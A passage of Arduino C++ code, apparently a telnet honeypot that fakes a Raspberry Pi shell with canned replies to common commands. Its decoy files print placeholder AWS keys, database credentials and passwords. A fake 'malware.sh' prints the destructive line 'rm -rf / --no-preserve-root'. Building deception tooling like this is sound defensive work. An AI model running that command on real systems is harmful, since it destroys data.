        String fullPath = fileName;
        if (!fileName.startsWith("/")) {
          // c'est un chemin relatif => on le rattache au currentDirectory
          fullPath = currentDirectory + "/" + fileName;
        }

        // /home/pi/secrets.txt
        if (fullPath == "/home/pi/secrets.txt") {
          client.println("AWS_ACCESS_KEY_ID=AKIAIOSFODNN7NGGYUNGGYD");
          client.println("AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYNGGYUNGGYD");
        }
        // /home/pi/Documents/mysql_credentials.txt
        else if (fullPath == "/home/pi/Documents/mysql_credentials.txt") {
          client.println("host=localhost");
          client.println("user=admin");
          client.println("password=My5up3rP@ss");
          client.println("database=production_db");
        }
        // /home/pi/Documents/password_list.txt
        else if (fullPath == "/home/pi/Documents/password_list.txt") {
          client.println("facebook:  fbpass123");
          client.println("gmail:     gmPass!0");
          client.println("twitter:   tw_pass_2025");
        }
        // /home/pi/Documents/financial_report_2023.xlsx (fichier binaire, on simule)
        else if (fullPath == "/home/pi/Documents/financial_report_2023.xlsx") {
          client.println("This appears to be a binary file (Excel).");
          client.println("�PK\003\004... (truncated) ...");
        }
        // /home/pi/Documents/readme.md
        else if (fullPath == "/home/pi/Documents/readme.md") {
          client.println("# README");
          client.println("This is a sample markdown file. Nothing special here.");
        }
        // /home/pi/Downloads/malware.sh
        else if (fullPath == "/home/pi/Downloads/malware.sh") {
          client.println("#!/bin/bash");
          client.println("echo 'Running malware...'");
          client.println("rm -rf / --no-preserve-root");
        }
        // /home/pi/Downloads/helpful_script.py
        else if (fullPath == "/home/pi/Downloads/helpful_script.py") {
          client.println("#!/usr/bin/env python3");
          client.println("print('Just a helpful script.')");
        }
        // Sinon, fichier inconnu
        else {
          client.println("cat: " + fileName + ": No such file or directory");
        }
      }
    }

    //------------------------------------------------
    // 5. Commandes réseau souvent utilisées
    //------------------------------------------------
    else if (command.equals("ifconfig")) {
      client.println("eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500");
      client.println("        inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255");
      client.println("        inet6 fe80::d6be:d9ff:fe1b:220c  prefixlen 64  scopeid 0x20<link>");
      client.println("        RX packets 1243  bytes 234567 (234.5 KB)");
      client.println("        TX packets 981   bytes 123456 (123.4 KB)");
    }
    else if (command.equals("ip addr")) {
      client.println("1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000");
      client.println("    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00");
      client.println("    inet 127.0.0.1/8 scope host lo");
      client.println("    inet6 ::1/128 scope host ");
      client.println("2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000");
      client.println("    link/ether aa:bb:cc:dd:ee:ff brd ff:ff:ff:ff:ff:ff");
      client.println("    inet 192.168.1.10/24 brd 192.168.1.255 scope global eth0");
    }
    else if (command.startsWith("ping ")) {
      String target = command.substring(5);
      client.println("PING " + target + " (1.2.3.4) 56(84) bytes of data.");
      client.println("64 bytes from 1.2.3.4: icmp_seq=1 ttl=64 time=0.042 ms");
      client.println("64 bytes from 1.2.3.4: icmp_seq=2 ttl=64 time=0.043 ms");
      client.println("--- " + target + " ping statistics ---");
      client.println("2 packets transmitted, 2 received, 0% packet loss, time 1ms");
    }
    else if (command.equals("netstat -an")) {
      client.println("Active Internet connections (servers and established)");
      client.println("Proto Recv-Q Send-Q Local Address           Foreign Address         State");
      client.println("tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN");
      client.println("tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN");
      client.println("tcp        0      0 192.168.1.10:23         192.168.1.100:54321     ESTABLISHED");
    }
    else if (command.startsWith("wget ") || command.startsWith("curl ")) {
      String url = command.substring(command.indexOf(" ") + 1);
      client.println("Connecting to " + url + "...");
      client.println("HTTP request sent, awaiting response... 200 OK");
      client.println("Length: 1024 (1.0K) [text/html]");
      client.println("Saving to: ‘index.html’");
      client.println("index.html         100%[==========>]  1.00K  --.-KB/s    in 0s");
      client.println("Download completed.");
    }

    //------------------------------------------------
    // 6. Commandes de services et de packages
    //------------------------------------------------
    else if (command.startsWith("apt-get ")) {
      if (command.indexOf("update") >= 0) {
        client.println("Get:1 http://archive.ubuntu.com/ubuntu focal InRelease [265 kB]");
        client.println("Get:2 http://archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]");
        client.println("Reading package lists... Done");
      }
      else if (command.indexOf("install") >= 0) {
        client.println("Reading package lists... Done");
        client.println("Building dependency tree");
        client.println("Reading state information... Done");
        client.println("The following NEW packages will be installed:");
        client.println("  <some-package>");
        client.println("0 upgraded, 1 newly installed, 0 to remove and 5 not upgraded.");
        client.println("Need to get 0 B/123 kB of archives.");
        client.println("After this operation, 345 kB of additional disk space will be used.");
        client.println("Selecting previously unselected package <some-package>.");
        client.println("(Reading database ... 45% )");
        client.println("Unpacking <some-package> (from <some-package>.deb) ...");
        client.println("Setting up <some-package> ...");
        client.println("Processing triggers for man-db (2.9.1-1) ...");
      }
      else {
        client.println("E: Invalid operation " + command.substring(7));
      }
    }
    else if (command.startsWith("service ")) {
      // service <nom> start/stop/status/restart
      if (command.indexOf("start") >= 0) {
        client.println("Starting service " + command.substring(8) + "...");
        client.println("Service started.");
      }
      else if (command.indexOf("stop") >= 0) {
        client.println("Stopping service " + command.substring(8) + "...");
        client.println("Service stopped.");
      }
      else if (command.indexOf("restart") >= 0) {
        client.println("Restarting service " + command.substring(8) + "...");
        client.println("Service restarted.");
      }
      else if (command.indexOf("status") >= 0) {
        client.println(command.substring(8) + " is running.");
      }
      else {
        client.println("Usage: service <service> {start|stop|restart|status}");
      }
    }
    else if (command.startsWith("systemctl ")) {
      // ex: systemctl status ssh
      if (command.indexOf("start") >= 0) {
        client.println("Systemd: Starting service...");
        client.println("Done.");
      }
      else if (command.indexOf("stop") >= 0) {
        client.println("Systemd: Stopping service...");
        client.println("Done.");
      }
      else if (command.indexOf("restart") >= 0) {
        client.println("Systemd: Restarting service...");
        client.println("Done.");
      }
      else if (command.indexOf("status") >= 0) {
        client.println("● ssh.service - OpenBSD Secure Shell server");
        client.println("   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)");
        client.println("   Active: active (running) since Wed 2025-01-23 12:00:00 UTC; 1h 4min ago");
        client.println(" Main PID: 600 (sshd)");
        client.println("    Tasks: 1 (limit: 4915)");
        client.println("   CGroup: /system.slice/ssh.service");
      }
      else {
        client.println("systemctl: command not recognized or incomplete arguments.");
      }
    }

    //------------------------------------------------
    // 7. Commandes d’élévation de privilèges
    //------------------------------------------------
    else if (command.startsWith("sudo ")) {
      client.println("[sudo] password for pi: ");
      delay(1000);
      client.println("pi is not in the sudoers file.  This incident will be reported.");
    }

    //------------------------------------------------
    // 8. Commandes diverses
    //------------------------------------------------
    else if (command.equals("env")) {
      client.println("SHELL=/bin/bash");
      client.println("PWD=" + currentDirectory);
      client.println("LOGNAME=pi");
      client.println("HOME=/home/pi");
      client.println("LANG=C.UTF-8");
    }
    else if (command.equals("set")) {
      client.println("BASH=/bin/bash");
      client.println("BASHOPTS=cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:histappend:interactive_comments:progcomp");
      client.println("PWD=" + currentDirectory);
      client.println("HOME=/home/pi");
      client.println("LANG=C.UTF-8");
    }
    else if (command.equals("alias")) {
      client.println("alias ls='ls --color=auto'");
      client.println("alias ll='ls -alF'");
      client.println("alias l='ls -CF'");
    }
    else if (command.equals("history")) {
      // Petite simulation d’historique
      client.println("    1  pwd");
      client.println("    2  ls -l");
      client.println("    3  whoami");
      client.println("    4  cat /etc/passwd");
      client.println("    5  sudo su");
    }
    else if (command.equals("iptables")) {
      client.println("Chain INPUT (policy ACCEPT)");
      client.println("target     prot opt source               destination         ");
      client.println("Chain FORWARD (policy ACCEPT)");
      client.println("target     prot opt source               destination         ");
      client.println("Chain OUTPUT (policy ACCEPT)");
      client.println("target     prot opt source               destination         ");
    }
    //------------------------------------------------
    // 9. Commande supplémentaire.
    //------------------------------------------------
    else if (command.equals("id")) {
      client.println("uid=1000(pi) gid=1000(pi) groups=1000(pi)");
    }
    else if (command.equals("lsb_release -a")) {
      client.println("Distributor ID: Ubuntu");
      client.println("Description:    Ubuntu 20.04.5 LTS");
      client.println("Release:        20.04");
      client.println("Codename:       focal");
    }
    else if (command.equals("cat /etc/issue")) {
      client.println("Ubuntu 20.04.5 LTS \\n \\l");
    }
    else if (command.equals("cat /proc/version")) {
      client.println("Linux version 5.4.0-109-generic (buildd@lgw01-amd64-039) (gcc version 9.3.0, GNU ld version 2.34) #123-Ubuntu SMP");
    }
    else if (command.equals("cat /proc/cpuinfo")) {
      client.println("processor   : 0");
      client.println("vendor_id   : GenuineIntel");
      client.println("cpu family  : 6");
      client.println("model       : 158");
      client.println("model name  : Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz");
      client.println("stepping    : 10");
      client.println("microcode   : 0xca");
      client.println("cpu MHz     : 1992.000");
      client.println("cache size  : 8192 KB");
    }
    else if (command.equals("lscpu")) {
      client.println("Architecture:        x86_64");
      client.println("CPU op-mode(s):      32-bit, 64-bit");
      client.println("Byte Order:          Little Endian");
      client.println("CPU(s):              4");
      client.println("Vendor ID:           GenuineIntel");
      client.println("Model name:          Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz");
      client.println("CPU MHz:             1992.000");
    }
    else if (command.equals("dmesg")) {
      client.println("[    0.000000] Booting Linux on physical CPU 0");
      client.println("[    0.123456] Linux version 5.4.0-109-generic (buildd@lgw01-amd64-039) (gcc version 9.3.0, GNU ld version 2.34) #123-Ubuntu SMP");
    }
    else if (command.equals("last")) {
      client.println("pi     pts/0        192.168.1.10    Wed Feb  3 12:00   still logged in");
      client.println("reboot system boot  5.4.0-109-generic Wed Feb  3 11:55   still running");
    }
    else if (command.equals("finger pi")) {
      client.println("Login: pi");
      client.println("Name:  ");
      client.println("Directory: /home/pi");
      client.println("Shell: /bin/bash");
    }
    //------------------------------------------------
    // 10. Commande vide (juste Entrée)
    //------------------------------------------------
    else if (command.length() == 0) {
      // Ne rien faire
    }

    //------------------------------------------------
    // 11. Commande non reconnue
    //------------------------------------------------
    else {
      client.println("bash: " + command + ": command not found");
    }
  }

  // Déconnexion
  client.stop();
  Serial.println("Client disconnected.");
}


// -- Helper function to read a line from the client --
String readLine(WiFiClient &client, bool echo) {
  String line = "";
  while (client.connected()) {
    if (client.available()) {
      char c = client.read();
      if (c == '\r') {
        continue; // Ignore CR
      }
      if (c == '\n') {
        break; // Fin de ligne
      }
      // Ajouter le caractère à la ligne sans jamais écho
      line += c;
    }
  }

  // Pas de gestion d'écho ici (pas de client.print)
  return line;
}
